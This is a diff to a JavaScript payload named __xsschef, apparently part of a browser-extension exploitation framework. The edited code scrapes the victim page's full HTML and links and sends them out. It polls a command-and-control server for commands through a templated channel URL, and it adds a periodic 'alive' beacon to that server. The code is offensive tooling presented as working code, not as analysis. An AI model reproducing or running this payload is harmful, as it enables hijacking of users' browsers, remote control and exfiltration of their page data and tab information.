@@ -17,10 +17,13 @@ function __xsschef() {
         switch (msg.cmd) {
             case 'sendhtml':
                 var links = [];
+                
                 var nodes = document.getElementsByTagName('a');
                 for (var i = 0; i < nodes.length; i++) {
-                    links.push({'href':nodes[i].href, 'title':nodes[i].title, 'html':nodes[i].innerHTML});
-                }  
+                    if (nodes[i].href) {
+                        links.push({'href':nodes[i].href, 'title':nodes[i].title, 'html':nodes[i].innerHTML});
+                    }
+                }                
                 __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML, 'links':links}});
             break;
             case 'sendinfo':
@@ -50,7 +53,6 @@ function __xsschef() {
                 
            /* poll for commands from c&c server and send them to ext */
             setInterval(function() {
-                //console.log('polling for cmds');
                 var x = new XMLHttpRequest();
                 x.open('GET', url + '?ch=__CMD_CHANNEL__', true);
                 x.onreadystatechange = function () {
@@ -266,11 +268,11 @@ function __xsschef() {
         log('foothold started');
         report_tabs();
         report_ext();
-        /*
-        setInterval(function() {
-            log('alive');
-        }, 20000);
-        */
+        if ('__URL__'.match(/^http/)) { // we need to keep the connection alive
+            setInterval(function() {
+                log('alive');
+            }, 20000);
+        }
     }
 };
 
